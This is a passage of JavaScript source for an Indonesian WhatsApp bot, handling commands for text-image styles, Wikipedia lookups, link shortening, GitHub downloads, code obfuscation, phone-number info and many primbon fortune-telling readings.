'nakroth-3', 'arthur', 'ryoma-2', 'ryoma', 'raz-2', 'nganga-2', 'astrid-2', 'astrid', 'zanis-4', 'xeniel', 'wukong-3', 'noren', 'lauriel-3', 'joker', 'xeniel-2', 'telannas-3', 'nurad-3', 'lubu-4', 'lubu-3', 'kriknak-2', 'kahlii-2', 'diaochanlubu', 'chaugnar-2', 'azzenka-2', 'alice-2', 'aleister-2', 'noren-2', 'lubu-5', 'lauriel-4', 'kilgoth', 'gildur-2', 'fennik-3', 'zephys-3', 'wonderwoman', 'superman-2', 'slimz-3', 'natalya-4', 'krixi-5', 'krixi-4', 'zephys-2', 'zanis-5', 'yorn-4', 'xeniel-3', 'wonderwoman-2', 'violet-4', 'naloch-3', 'airi-4', 'telannas-4', 'ormarr-4', 'ormarr-3', 'nakroth-4', 'kilgroth-2', 'kahlii-3', 'grakk-3', 'natalya-5', 'fennik-4', 'valhein-3', 'teemee-2', 'teemee', 'lindis', 'zuka-3', 'tulen', 'toro-2', 'nina-3', 'naloch-4', 'lumburr-2', 'lindis-2', 'joker-2', 'grakk-4', 'gildur-3', 'aleister-3', 'tulen-2', 'toro-3', 'taara-3', 'omen-2', 'omen', 'zill-3', 'arthurtelannas', 'zuka-4', 'nakroth-5', 'nax', 'liliana', 'raz-3', 'liliana-2', 'nax-2', 'krixnak-3', 'joker-3', 'chaugnar-3', 'wisp', 'ryoma-3', 'batman-3', 'airi-6', 'tulen-3', 'cresht-3', 'cresht-2', 'astris-3', 'flash', 'arum-2', 'arum', 'butterfly-6', 'alice-3', 'xeniel-4', 'valhein-4', 'tulen-4', 'rourke-2', 'rourke', 'nurad-4', 'nax-3', 'wisp-2', 'narja-2', 'narja', 'zuka-5', 'jinna-3', 'butterfly-7', 'arthur-5', 'valhein-5', 'superman-3', 'liliana-3', 'kilgroth', 'wirosabaleng', 'roxie-2', 'roxie', 'wukong-4', 'baldum-2', 'baldum', 'zephys-4', 'annette-2', 'annette', 'telannas-6', 'raz-4', 'nurad-6', 'nurad-5', 'jinna-4', 'amily', 'ybneth-2', 'ybneth', 'ilumia-4', 'amily-2', 'xeniel-5', 'veera-5', 'liliana-4', 'flash-2', 'arthur-2', 'omen-3', 'lindis-3', 'elsu-2', 'elsu', 'richter-2', 'richter', 'nina-4', 'thane-3', 'ryoma-4', 'quillen-2', 'quillen', 'lauriel-5', 'arum-3', 'wisp-3', 'violet-7', 'sephera-2', 'sephera', 'naloch-5', 'krixi-6', 'alice-4', 'tulen-5', 'skud-3', 'rourke-3', 'nakroth-6', 'florentino-2', 'florentino', 'elsu-3', 'butterfly-8', 'amily-3', 'zuka-7', 'zuka-6', 'yorn-7', 'yorn-6', 'veres-2', 'veres', 'naloch-6', 'cresht-4', 'azzenka-3', 'airi-7', 'zephys-5', 'yorn-5', 'violet-8', 'valhein-6', 'thane-4', 'roxie-3', 'nakroth-7', 'kahlii-4', 'elsu-4', 'darcy-2', 'darcy', 'capheny', 'zill-4', 'hayate-2', 'hayate', 'cresht-5', 'annette-3', 'amily-4', 'tulen-7', 'telannas-7', 'omen-4', 'lindis-4', 'liliana-5', 'ignis-3', 'errol', 'capheny-2', 'arum-4', 'zanis-6', 'wukong-5', 'thane-5', 'slimz-4', 'skud-4', 'richter-3', 'quillen-3', 'azzenka-4', 'arduin-3', 'airi-8']
                if (!style.includes(m2)) {
                    getStyle(style.length, "style")
                }
                else {
                    reply(mess.wait)
                    let textpro2 = await fetch(api('alfa', '/api/ephoto360/' + command, {
                        text: m1,
                        style: m2
                    }, 'apikey'))
                    if (!textpro2.ok) throw await textpro2.text()
                    let img = await textpro2.buffer()
                    tganz.sendFile(m.chat, img, 'ephoto360.jpg', mess.done, m)
                }
            }
            break
            case 'wiki':
            case 'wikimedia':
            case 'wikipedia': {
            if (isBan) return reply(mess.ban)
            if (!text) return reply(`Mᴀᴜ ᴄᴀʀɪ ᴀᴘᴀ ᴋᴀᴋ ?\n*❑ Cᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ : ${prefix + command} Bᴇɴᴜᴀ Aᴛʟᴀɴᴛɪs*`)
                m.reply(mess.wait)
                let { wikimedia } = require('./lib/scraper')
                anu = await wikimedia(text)
                result = anu[Math.floor(Math.random() * anu.length)]
                let buttons = [
                    {buttonId: `.wiki ${text}`, buttonText: {displayText: 'LANJUT ⌲'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: result.image },
                    caption: `⭔ ❑ *Jᴜᴅᴜʟ* : ${result.title}\n⭔ ❑ *Sᴜᴍʙᴇʀ* : ${result.source}\n⭔ ❑ *Lɪɴᴋ Gᴀᴍʙᴀʀ* : ${result.image}`,
                    footer: footer_text,
                    buttons: buttons,
                    headerType: 4
                }
                tganz.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case 'tinyurl': {
               if (isBan) return reply(mess.ban)
            	if (!q) return reply(`Mᴀsᴜᴋᴀɴ ʟɪɴᴋ/ᴜʀʟ ᴘᴀɴᴊᴀɴɢ ᴜɴᴛᴜᴋ ᴅɪ ᴊᴀᴅɪᴋᴀɴ ʟɪɴᴋ *${command}* !!!\n\n*❑ Lɪɴᴋ ʏᴀɴɢ sᴜᴅᴀʜ ᴅɪ ᴋᴏɴᴠᴇʀsɪ ᴀᴋᴀɴ ᴍᴇɴᴊᴀᴅɪ ᴘᴇɴᴅᴇᴋ ᴅᴀɴ sɪᴍᴘʟᴇ ᴜɴᴛᴜᴋ ᴅɪ ʙᴀɢɪᴋᴀɴ !*`)
                request(`https://tinyurl.com/api-create.php?url=${q}`, function (error, response, body) {
 try {
  m.reply(`❏ *Hᴀsɪʟ* : ${body}`)
  } catch (e) {
  m.reply(e)
  }
  })
  }
 break
           case 'bitly': {
           if (isBan) return reply(mess.ban)
            	if (!text) return reply(`Mᴀsᴜᴋᴀɴ ʟɪɴᴋ/ᴜʀʟ ᴘᴀɴᴊᴀɴɢ ᴜɴᴛᴜᴋ ᴅɪ ᴊᴀᴅɪᴋᴀɴ ʟɪɴᴋ *${command}* !!!\n\n*❑ Lɪɴᴋ ʏᴀɴɢ sᴜᴅᴀʜ ᴅɪ ᴋᴏɴᴠᴇʀsɪ ᴀᴋᴀɴ ᴍᴇɴᴊᴀᴅɪ ᴘᴇɴᴅᴇᴋ ᴅᴀɴ sɪᴍᴘʟᴇ ᴜɴᴛᴜᴋ ᴅɪ ʙᴀɢɪᴋᴀɴ !*`)
         let json = await (await fetch(`https://api.xteam.xyz/shorturl/bitly?url=${text}&apikey=Dawnfrostkey`)).json()
      if (!json.status) throw json
    let hasil = `❏ *Hᴀsɪʟ* : ${json.result.link}`.trim()
    m.reply(hasil)
            }
            break
           case 'cuttly': {
           if (isBan) return reply(mess.ban)
            	if (!text) return reply(`Mᴀsᴜᴋᴀɴ ʟɪɴᴋ/ᴜʀʟ ᴘᴀɴᴊᴀɴɢ ᴜɴᴛᴜᴋ ᴅɪ ᴊᴀᴅɪᴋᴀɴ ʟɪɴᴋ *${command}* !!!\n\n*❑ Lɪɴᴋ ʏᴀɴɢ sᴜᴅᴀʜ ᴅɪ ᴋᴏɴᴠᴇʀsɪ ᴀᴋᴀɴ ᴍᴇɴᴊᴀᴅɪ ᴘᴇɴᴅᴇᴋ ᴅᴀɴ sɪᴍᴘʟᴇ ᴜɴᴛᴜᴋ ᴅɪ ʙᴀɢɪᴋᴀɴ !*`)
                let cuttly = await fetchJson(`https://api.botcahx.biz.id/api/linkshort/cuttly?link=${text}&apikey=Admin`)
                tganz.sendMessage(m.chat, { text: cuttly.result.shortLink }, { quoted: m })
            }
            break
            case 'avatarff': {
            if (isBan) return reply(mess.ban)
                if (!text) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} teks|character\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} TᴇsᴛGᴀɴᴢ|alok`)
                if (!text.includes('|')) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} teks|character\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} TᴇsᴛGᴀɴᴢ|alok`)
                var mon = args.join(' ')
                var m1 = mon.split("|")[0]
                var m2 = mon.split("|")[1]
                const style = ['a124', 'alok', 'alvaro', 'andrew', 'antonio', 'caroline', 'ford', 'hayato', 'joseph', 'kelly', 'kla', 'laura', 'naxim', 'niguel', 'nisa', 'noco', 'nikita', 'notora', 'olivia', 'paloma', 'rafael', 'shani', 'steffie', 'wukong']
                if (!style.includes(m2)) {
                    getStyle(style.length, "character")
                }
                else {
                    reply(mess.wait)
                    let textpro2 = await fetch(api('alfa', '/api/ephoto360/' + command, {
                        text: m1,
                        character: m2
                    }, 'apikey'))
                    if (!textpro2.ok) throw await textpro2.text()
                    let img = await textpro2.buffer()
                    tganz.sendFile(m.chat, img, 'ephoto360.jpg', mess.done, m)
                }
            }
            break
            case 'ceknomor': 
            case 'nohoki': 
            case 'nomerhoki': 
            case 'nomorhoki': {
            if (isBan) return reply(mess.ban)
                if (!Number(text)) return reply(`Mᴀᴜ ᴄᴇᴋ ɴᴏᴍᴏʀ sɪᴀᴘᴀ ?\n*Cᴏɴᴛᴏʜ : ${prefix + command} 6289512696170*`)
                let anu = await primbon.nomer_hoki(Number(text))
                if (anu.status == false) return m.reply(anu.message)
                tganz.sendText(m.chat, `*⫹⫺ Rᴀᴍᴀʟ Nᴏᴍᴏʀ :* ${anu.message.nomer_hp}\n⊙═════════════════⊙\n*❑ Aɴɢᴋᴀ Sʜᴜᴢɪ :* ${anu.message.angka_shuzi}\n⊙══════════════⊙\n*⫹⫺ Eɴᴇʀɢɪ Pᴏsɪᴛɪғ :*\n❑ Kᴇᴋᴀʏᴀᴀɴ : ${anu.message.energi_positif.kekayaan}\n❑ Kᴇsᴇʜᴀᴛᴀɴ : ${anu.message.energi_positif.kesehatan}\n❑ Cɪɴᴛᴀ : ${anu.message.energi_positif.cinta}\n❑ Kᴇsᴛᴀʙɪʟᴀɴ : ${anu.message.energi_positif.kestabilan}\n❑ Pᴇʀsᴇɴᴛᴀsᴇ : ${anu.message.energi_positif.persentase}\n⊙══════════════⊙\n*⫹⫺ Eɴᴇʀɢɪ Nᴇɢᴀᴛɪғ :*\n❑ Pᴇʀsᴇʟɪsɪʜᴀɴ : ${anu.message.energi_negatif.perselisihan}\n❑ Kᴇʜɪʟᴀɴɢᴀɴ : ${anu.message.energi_negatif.kehilangan}\n❑ Mᴀʟᴀᴘᴇᴛᴀᴋᴀ : ${anu.message.energi_negatif.malapetaka}\n❑ Kehancuran : ${anu.message.energi_negatif.kehancuran}\n❑ Pᴇʀsᴇɴᴛᴀsᴇ : ${anu.message.energi_negatif.persentase}\n⊙═════════════════⊙`, m)
            }
            break
            case 'artimimpi': case 'tafsirmimpi': {
            if (isBan) return reply(mess.ban)
                if (!text) return reply(`Contoh : ${prefix + command} belanja`)
                let anu = await primbon.tafsir_mimpi(text)
                if (anu.status == false) return m.reply(anu.message)
                tganz.sendText(m.chat, `⭔ *⫹⫺ Aʀᴛɪ Mɪᴍᴘɪ :* ${anu.message.mimpi}\n\n⭔ *⫹⫺ Aʀᴛɪ ᴅᴀʀɪ ᴍɪᴍᴘɪ ᴛᴇʀsᴇʙᴜᴛ :*\n${anu.message.arti}\n\n⭔ *⫹⫺ Sᴏʟᴜsɪ ᴜɴᴛᴜᴋ ᴍɪᴍᴘɪ ᴛᴇʀsᴇʙᴜᴛ :*\n${anu.message.solusi}`, m)
            }
            break
            case 'ramalanjodoh': case 'ramaljodoh': {
            if (isBan) return reply(mess.ban)
                if (!text) return reply(`Contoh : ${prefix + command} TestGanz, 7, 7, 2005, putri halifa, 16, 11, 2004`)
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                let anu = await primbon.ramalan_jodoh(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return m.reply(anu.message)
                tganz.sendText(m.chat, `⭔ *Nama Anda :* ${anu.message.nama_anda.nama}\n⭔ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n⭔ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'ramalanjodohbali': case 'ramaljodohbali': {
            if (isBan) return reply(mess.ban)
                if (!text) return reply(`Contoh : ${prefix + command} TestGanz, 7, 7, 2005, putri halifa, 16, 11, 2004`)
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                let anu = await primbon.ramalan_jodoh_bali(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return m.reply(anu.message)
                tganz.sendText(m.chat, `⭔ *Nama Anda :* ${anu.message.nama_anda.nama}\n⭔ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n⭔ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'suamiistri': {
            if (isBan) return reply(mess.ban)
                if (!text) return reply(`Contoh : ${prefix + command} TestGanz, 7, 7, 2005, putri halifa, 16, 11, 2004`)
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                let anu = await primbon.suami_istri(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return m.reply(anu.message)
                tganz.sendText(m.chat, `⭔ *Nama Suami :* ${anu.message.suami.nama}\n⭔ *Lahir Suami :* ${anu.message.suami.tgl_lahir}\n⭔ *Nama Istri :* ${anu.message.istri.nama}\n⭔ *Lahir Istri :* ${anu.message.istri.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'ramalancinta': case 'ramalcinta': {
            if (isBan) return reply(mess.ban)
                if (!text) return reply(`Contoh : ${prefix + command} TestGanz, 7, 7, 2005, putri halifa, 16, 11, 2004`)
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                let anu = await primbon.ramalan_cinta(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return m.reply(anu.message)
                tganz.sendText(m.chat, `⭔ *Nama Anda :* ${anu.message.nama_anda.nama}\n⭔ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n⭔ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n⭔ *Sisi Positif :* ${anu.message.sisi_positif}\n⭔ *Sisi Negatif :* ${anu.message.sisi_negatif}\n\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'artinama': {
            if (isBan) return reply(mess.ban)
                if (!text) return reply(`Contoh : ${prefix + command} TestGanz Ardianta`)
                let anu = await primbon.arti_nama(text)
                if (anu.status == false) return m.reply(anu.message)
                tganz.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Arti :* ${anu.message.arti}\n\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'kecocokannama': case 'cocoknama': {
            if (isBan) return reply(mess.ban)
                if (!text) return reply(`Contoh : ${prefix + command} TestGanz, 7, 7, 2005`)
                let [nama, tgl, bln, thn] = text.split`,`
                let anu = await primbon.kecocokan_nama(nama, tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                tganz.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Life Path :* ${anu.message.life_path}\n⭔ *Destiny :* ${anu.message.destiny}\n⭔ *Destiny Desire :* ${anu.message.destiny_desire}\n⭔ *Personality :* ${anu.message.personality}\n⭔ *Persentase :* ${anu.message.persentase_kecocokan}`, m)
            }
            break
            case 'kecocokanpasangan': case 'cocokpasangan': case 'pasangan': {
            if (isBan) return reply(mess.ban)
                if (!text) return reply(`Contoh : ${prefix + command} TestGanz|putri halifa`)
                let [nama1, nama2] = text.split`|`
                let anu = await primbon.kecocokan_nama_pasangan(nama1, nama2)
                if (anu.status == false) return m.reply(anu.message)
                tganz.sendImage(m.chat,  anu.message.gambar, `⭔ *Nama Anda :* ${anu.message.nama_anda}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan}\n⭔ *Sisi Positif :* ${anu.message.sisi_positif}\n⭔ *Sisi Negatif :* ${anu.message.sisi_negatif}`, m)
            }
            break
            case 'jadianpernikahan': case 'jadiannikah': {
            if (isBan) return reply(mess.ban)
                if (!text) return reply(`Contoh : ${prefix + command} 6, 12, 2020`)
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.tanggal_jadian_pernikahan(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                tganz.sendText(m.chat, `⭔ *Tanggal Pernikahan :* ${anu.message.tanggal}\n⭔ *karakteristik :* ${anu.message.karakteristik}`, m)
            }
            break
            case 'ebinary': {
            if (isBan) return reply(mess.ban)
            if (!text) return reply(`Tᴇᴋsɴʏᴀ ᴍᴀɴᴀ ᴋᴀᴋ ?\n*❑ Cᴏɴᴛᴏʜ : ${prefix + command} Tᴇsᴛ Gᴀɴᴛᴇɴɢ*`)
            let { eBinary } = require('./lib/binary')
            let eb = await eBinary(text)
            m.reply(eb)
        }
        break
        case 'git': case 'gitclone': {
         if (isBan) return reply(mess.ban)
if (!args[0]) return m.reply(`Lɪɴᴋɴʏᴀ ᴍᴀɴᴀ ᴋᴀᴋ ?\n*❑ Cᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ : ${prefix}${command} https://github.com/Sansekai/Wa-OpenAI*`)
if (!isUrl(args[0]) && !args[0].includes('github.com')) return m.reply(`*Lɪɴᴋ ʏᴀɴɢ ᴋᴀᴍᴜ ᴋɪʀɪᴍ ʙᴜᴋᴀɴ ʟɪɴᴋ ᴅᴀʀɪ ɢɪᴛʜᴜʙ.ᴄᴏᴍ !!!*`)
     reply(mess.wait)
let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
    let [, user, repo] = args[0].match(regex1) || []
    repo = repo.replace(/.git$/, '')
    let url = `https://api.github.com/repos/${user}/${repo}/zipball`
    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
    tganz.sendMessage(m.chat, { document: { url: url }, fileName: filename, mimetype: 'application/zip' }, { quoted: m }).catch((err) => reply(mess.error))
    }
break
          case 'encrypt': 
          case 'encrpt': 
          case 'enkripsi': 
          case 'enc': {
           if (isBan) return reply(mess.ban)
            if (!q) return reply(`Tᴇᴋsɴʏᴀ ᴍᴀɴᴀ ᴋᴀᴋ ?\n❑ Cᴏɴᴛᴏʜ : ${prefix + command} ⟨ *ᴛᴇᴍᴘᴇʟ ғɪᴛᴜʀɴʏᴀ* ⟩\n\n❑ *ᴜᴛᴀᴍᴀᴋᴀɴ ʜᴀᴘᴜs ʙᴀɢɪᴀɴ ᴄᴀsᴇ 'ғɪᴛᴜʀ': ᴅᴀɴ ᴀᴋʜɪʀᴀɴ ʙᴇʀɴᴀᴍᴀ ʙʀᴇᴀᴋ. ᴀɢᴀʀ ғɪᴛᴜʀ ɪɴɪ ʙᴇᴋᴇʀᴊᴀ ᴅᴀʟᴀᴍ ᴍᴇɴɢᴇɴᴋʀɪᴘsɪ ғɪᴛᴜʀ ʙᴏᴛ ᴍᴜ !!!*`)
            let meg = await obfus(q)
            m.reply(`❑ *Hᴀsɪʟ ᴇɴᴋʀɪᴘsɪ ʙʏ TᴇsᴛGᴀɴᴢ* :\n═════════════════════❑\n\n${meg.result}\n\n═════════════════════❑\n\n❑ *ᴇɴᴋʀɪᴘsɪ ɪɴɪ ʜᴀɴʏᴀ ᴍᴇɴᴜᴛᴜᴘɪ ᴋᴀᴛᴀ - ᴋᴀᴛᴀ ʏᴀɴɢ ᴍᴇɴᴜʀᴜᴛɴʏᴀ ᴘᴇɴᴛɪɴɢ ᴍᴇɴᴊᴀᴅɪ ᴛᴇʀᴛᴜᴛᴜᴘ ᴅᴀɴ ᴛɪᴅᴀᴋ ᴅɪ ᴋᴇᴛᴀʜᴜɪ ᴏʟᴇʜ sɪᴀᴘᴀᴘᴜɴ !!!*\n`)
        }
        break
           case 'dbinary': {
           if (isBan) return reply(mess.ban)
           if (!text) return reply(`Tᴇᴋsɴʏᴀ ᴍᴀɴᴀ ᴋᴀᴋ ?\n*❑ Cᴏɴᴛᴏʜ : ${prefix + command} Tᴇsᴛ Gᴀɴᴛᴇɴɢ*`)
           let { dBinary } = require('./lib/binary')
           let db = await dBinary(text)
           m.reply(db)
        }
        break
            case 'sifatusaha': {
            if (isBan) return reply(mess.ban)
                if (!ext)return reply(`Contoh : ${prefix+ command} 28, 12, 2021`)
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.sifat_usaha_bisnis(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                tganz.sendText(m.chat, `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Usaha :* ${anu.message.usaha}`, m)
            }
            break
            case 'rejeki': case 'rezeki': {
            if (isBan) return reply(mess.ban)
                if (!text) return reply(`Contoh : ${prefix + command} 7, 7, 2005`)
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.rejeki_hoki_weton(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                tganz.sendText(m.chat, `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Rezeki :* ${anu.message.rejeki}\n\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'pekerjaan': case 'kerja': {
            if (isBan) return reply(mess.ban)
                if (!text) return reply(`Contoh : ${prefix + command} 7, 7, 2005`)
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.pekerjaan_weton_lahir(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                tganz.sendText(m.chat, `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Pekerjaan :* ${anu.message.pekerjaan}\n\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'chati':
            case 'infoc':
            case 'chatinfo':
            case 'infochat': {
			    if (isBan) return reply(mess.ban)
          if (!m.isGroup) return reply(mess.group)
                if (!m.quoted) return reply(`*Bᴀʟᴀs ᴘᴇsᴀɴ ʙᴏᴛ ʏᴀɴɢ ɪɴɢɪɴ ᴅɪ ʟɪʜᴀᴛ ɪɴғᴏ ɴʏᴀ !!!*`)
                let msg = await m.getQuotedObj()
                if (!m.quoted.isBaileys) return replay(`*Pᴇsᴀɴ ᴛᴇʀsᴇʙᴜᴛ ʙᴜᴋᴀɴ ᴅᴀʀɪ ʙᴏᴛ !!!*`)
                let teks = '         ⫹ *Iɴғᴏʀᴍᴀsɪ Cʜᴀᴛ Bᴏᴛ* ⫺\n\n'
                for (let i of msg.userReceipt) {
                    let read = i.readTimestamp
                    let unread = i.receiptTimestamp
                    let waktu = read ? read : unread
                    teks += `╔═══════════❑\n`
                    teks += `╠❑ *Nᴏᴍᴏʀ* : @${i.userJid.split('@')[0]}\n╠❑ *Jᴀᴍ* : ${moment(waktu * 1000).format('HH:mm:ss z')}\n╠❑ *Sᴛᴀᴛᴜs* : ${read ? 'Nyimak' : 'Offline'}\n╚═══════════❑\n\n`
                }
                tganz.sendTextWithMentions(m.chat, teks, m)
            }
            break
            case 'infono':
            case 'infonumber':
            case 'infnomor':
            case 'infonomor': {
			    if (isBan) return reply(mess.ban)
			     if (!text) return reply(`*❑ Cᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ : ${prefix + command} 628xxx*`)
			          reply(mess.wait)
               anu = await fetchJson(`https://docs-jojo.herokuapp.com/api/infonomor?no=${text}`)
			        infonomor = `   ⌈ *Iɴғᴏ - Nᴏᴍᴏʀ*⌋\n*❑ Nᴏᴍᴏʀ :* ${anu.nomor}\n*❑ Iɴᴛᴇʀɴᴀsɪᴏɴᴀʟ :* ${anu.international}`
			        reply(infonomor)
			        }
			        break 
            case 'ramalannasib': case 'ramalnasib': case 'nasib': {
            if (isBan) return reply(mess.ban)
                if (!text) return reply(`Contoh❗:\n${prefix + command} 7,7,2005`)
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.ramalan_nasib(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                tganz.sendText(m.chat, `⭔ *Analisa :* ${anu.message.analisa}\n⭔ *Angka Akar :* ${anu.message.angka_akar}\n⭔ *Sifat :* ${anu.message.sifat}\n⭔ *Elemen :* ${anu.message.elemen}\n⭔ *Angka Keberuntungan :* ${anu.message.angka_keberuntungan}`, m)
            }
            break
            case 'potensipenyakit': case 'penyakit': {
            if (isBan) return reply(mess.ban)
                if (!text) return reply(`Contoh : ${prefix + command} 7,7,2005`)
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.cek_potensi_penyakit(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                tganz.sendText(m.chat, `⭔ *Analisa :* ${anu.message.analisa}\n⭔ *Sektor :* ${anu.message.sektor}\n⭔ *Elemen :* ${anu.message.elemen}\n\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'artitarot': case 'tarot': {
            if (isBan) return reply(mess.ban)
                if (!text) return reply(`Contoh : ${prefix + command} 7,7,2005`)
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.arti_kartu_tarot(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                tganz.sendImage(m.chat, anu.message.image, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Simbol Tarot :* ${anu.message.simbol_tarot}\n⭔ *Arti :* ${anu.message.arti}\n\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'fengshui': {
            if (isBan) return reply(mess.ban)
                if (!text) return reply(`Contoh : ${prefix + command} TestGanz,1,2005\n\nNote : ${prefix + command} Nama, gender, tahun lahir\nGender : 1 untuk laki-laki & 2 untuk perempuan`)
                let [nama, gender, tahun] = text.split`,`
                let anu = await primbon.perhitungan_feng_shui(nama, gender, tahun)
                if (anu.status == false) return m.reply(anu.message)
                tganz.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tahun_lahir}\n⭔ *Gender :* ${anu.message.jenis_kelamin}\n⭔ *Angka Kua :* ${anu.message.angka_kua}\n⭔ *Kelompok :* ${anu.message.kelompok}\n⭔ *Karakter :* ${anu.message.karakter}\n⭔ *Sektor Baik :* ${anu.message.sektor_baik}\n⭔ *Sektor Buruk :* ${anu.message.sektor_buruk}`, m)
            }
            break
            case 'haribaik': {
            if (isBan) return reply(mess.ban)
                if (!text) return reply(`Contoh : ${prefix + command} 7,7,2005`)
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.petung_hari_baik(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                tganz.sendText(m.chat, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Kala Tinantang :* ${anu.message.kala_tinantang}\n⭔ *Info :* ${anu.message.info}\n\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'harisangar': case 'taliwangke': {
            if (isBan) return reply(mess.ban)
                if (!text) return reply(`Contoh : ${prefix + command} 7,7,2005`)
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.hari_sangar_taliwangke(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                tganz.sendText(m.chat, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Info :* ${anu.message.info}\n\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'harinaas': case 'harisial': {
            if (isBan) return reply(mess.ban)
                if (!text) return reply(`Contoh : ${prefix + command} 7,7,2005`)
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.primbon_hari_naas(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                tganz.sendText(m.chat, `⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *Tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hari Naas :* ${anu.message.hari_naas}\n⭔ *Info :* ${anu.message.catatan}\n\n⭔ *Catatan :* ${anu.message.info}`, m)
            }
            break
            case 'nagahari': case 'harinaga': {
            if (isBan) return reply(mess.ban)
                if (!text) return reply(`Contoh : ${prefix + command} 7,7,2005`)
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.rahasia_naga_hari(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                tganz.sendText(m.chat, `⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *Tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Arah Naga Hari :* ${anu.message.arah_naga_hari}\n\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'arahrejeki': case 'arahrezeki': {
            if (isBan) return reply(mess.ban)
                if (!text) return reply(`Contoh : ${prefix + command} 7,7,2005`)
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.primbon_arah_rejeki(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
